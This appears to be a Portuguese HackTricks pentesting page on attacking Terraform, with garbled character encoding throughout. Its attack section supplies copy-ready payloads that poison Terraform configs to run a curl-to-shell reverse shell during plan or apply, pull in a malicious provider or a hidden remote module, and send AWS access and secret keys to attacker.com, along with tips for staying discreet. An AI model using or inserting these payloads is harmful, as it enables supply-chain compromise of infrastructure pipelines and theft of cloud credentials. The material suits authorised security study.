# Seguran√ßa do Terraform

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

HashiCorp Terraform √© uma **ferramenta de infraestrutura como c√≥digo** que permite definir recursos **na nuvem e locais** em arquivos de configura√ß√£o leg√≠veis por humanos que voc√™ pode versionar, reutilizar e compartilhar. Voc√™ pode ent√£o usar um fluxo de trabalho consistente para provisionar e gerenciar toda a sua infraestrutura ao longo do seu ciclo de vida. O Terraform pode gerenciar componentes de baixo n√≠vel como recursos de computa√ß√£o, armazenamento e rede, bem como componentes de alto n√≠vel como entradas DNS e recursos de SaaS.

### Como o Terraform funciona?

O Terraform cria e gerencia recursos em plataformas de nuvem e outros servi√ßos por meio de suas interfaces de programa√ß√£o de aplicativos (APIs). Os provedores permitem que o Terraform trabalhe com praticamente qualquer plataforma ou servi√ßo com uma API acess√≠vel.

![](<../../.gitbook/assets/image (33).png>)

HashiCorp e a comunidade Terraform j√° escreveram **mais de 1700 provedores** para gerenciar milhares de diferentes tipos de recursos e servi√ßos, e esse n√∫mero continua a crescer. Voc√™ pode encontrar todos os provedores publicamente dispon√≠veis no [Registro do Terraform](https://registry.terraform.io/), incluindo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog e muitos outros.

O fluxo de trabalho central do Terraform consiste em tr√™s etapas:

* **Escrever:** Voc√™ define recursos, que podem estar em v√°rios provedores de nuvem e servi√ßos. Por exemplo, voc√™ pode criar uma configura√ß√£o para implantar um aplicativo em m√°quinas virtuais em uma rede Virtual Private Cloud (VPC) com grupos de seguran√ßa e um balanceador de carga.
* **Planejar:** O Terraform cria um plano de execu√ß√£o descrevendo a infraestrutura que ele criar√°, atualizar√° ou destruir√° com base na infraestrutura existente e na sua configura√ß√£o.
* **Aplicar:** Com aprova√ß√£o, o Terraform executa as opera√ß√µes propostas na ordem correta, respeitando quaisquer depend√™ncias de recursos. Por exemplo, se voc√™ atualizar as propriedades de um VPC e alterar o n√∫mero de m√°quinas virtuais nesse VPC, o Terraform recriar√° o VPC antes de escalar as m√°quinas virtuais.

![](<../../.gitbook/assets/image (81).png>)

### Terraform Enterprise

O Terraform Enterprise permite que voc√™ **execute comandos** como `terraform plan` ou `terraform apply` remotamente em uma **vers√£o auto-hospedada do Terraform Cloud**. Portanto, se voc√™ encontrar a **chave API** para acessar esse servidor Terraform, voc√™ pode **compromet√™-lo**.\
Para mais informa√ß√µes, confira:

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Laborat√≥rio Terraform

Basta instalar o terraform no seu computador.

Aqui voc√™ tem um [guia](https://learn.hashicorp.com/tutorials/terraform/install-cli) e aqui voc√™ tem a [melhor maneira de baixar o terraform](https://www.terraform.io/downloads).

## RCE no Terraform

O Terraform **n√£o possui uma plataforma que exp√µe uma p√°gina web ou um servi√ßo de rede** que possamos enumerar, portanto, a √∫nica maneira de comprometer o terraform √© **ser capaz de adicionar/modificar arquivos de configura√ß√£o do terraform**.

No entanto, o terraform √© um componente **muito sens√≠vel** para comprometer porque ter√° **acesso privilegiado** a diferentes locais para poder funcionar corretamente.

A principal maneira de um atacante ser capaz de comprometer o sistema onde o terraform est√° executando √© **comprometer o reposit√≥rio que armazena as configura√ß√µes do terraform**, porque em algum momento elas ser√£o **interpretadas**.

Na verdade, existem solu√ß√µes por a√≠ que **executam terraform plan/apply automaticamente ap√≥s a cria√ß√£o de um PR**, como o **Atlantis**:

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

Se voc√™ conseguir comprometer um arquivo terraform, existem diferentes maneiras de realizar RCE quando algu√©m executa `terraform plan` ou `terraform apply`.

### Terraform plan

O comando `terraform plan` √© o **mais utilizado** no terraform e desenvolvedores/solu√ß√µes que usam terraform o chamam o tempo todo, ent√£o a **maneira mais f√°cil de obter RCE** √© garantir que voc√™ envenene um arquivo de configura√ß√£o do terraform que executar√° comandos arbitr√°rios em um `terraform plan`.

#### Usando um provedor externo

O Terraform oferece o [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) que fornece uma maneira de interagir entre o Terraform e programas externos. Voc√™ pode usar a fonte de dados `external` para executar c√≥digo arbitr√°rio durante um `plan`.

Injetar em um arquivo de configura√ß√£o do terraform algo como o seguinte executar√° um rev shell ao executar `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Usando um provedor personalizado

Qualquer um pode escrever um [provedor personalizado](https://learn.hashicorp.com/tutorials/terraform/provider-setup) e public√°-lo no [Registro do Terraform](https://registry.terraform.io/). Voc√™ tamb√©m pode tentar puxar um provedor personalizado de um registro privado.

√â isso:

* escreva um provedor personalizado que execute algum c√≥digo malicioso (como exfiltrar credenciais ou dados de clientes)
* publique-o no Registro do Terraform
* adicione o provedor ao c√≥digo Terraform em uma branch de funcionalidade
* abra um PR para a branch de funcionalidade
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Uma vez que o provider ser√° importado durante o `init` e executar√° algum c√≥digo durante o `plan`, voc√™ tem execu√ß√£o arbitr√°ria de c√≥digo.

Voc√™ pode encontrar um exemplo em [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Usando uma refer√™ncia externa

Ambas as op√ß√µes mencionadas s√£o √∫teis, mas n√£o muito discretas (a segunda √© mais discreta, mas mais complexa que a primeira). Voc√™ pode realizar este ataque de uma maneira ainda mais **discreta**, seguindo estas sugest√µes:

* Em vez de adicionar o rev shell diretamente no arquivo terraform, voc√™ pode **carregar um recurso externo** que cont√©m o rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Voc√™ pode encontrar o c√≥digo rev shell em [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

* No recurso externo, use o recurso **ref** para ocultar o **c√≥digo terraform rev shell em um branch** dentro do reposit√≥rio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

O Terraform apply ser√° executado para aplicar todas as altera√ß√µes, voc√™ tamb√©m pode abusar dele para obter RCE injetando **um arquivo Terraform malicioso com** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Voc√™ s√≥ precisa garantir que algum payload como os seguintes termine no arquivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Siga as **sugest√µes da t√©cnica anterior** para realizar este ataque de uma **maneira mais discreta usando refer√™ncias externas**.

## Vazamento de Segredos

Voc√™ pode ter **valores secretos usados pelo terraform revelados** executando `terraform apply` ao adicionar ao arquivo terraform algo como:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Ferramentas de Auditoria

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utiliza an√°lise est√°tica do seu c√≥digo terraform para identificar poss√≠veis m√° configura√ß√µes.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan √© um analisador de c√≥digo est√°tico para Infraestrutura como C√≥digo.

## Refer√™ncias

* [Seguran√ßa Atlantis](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
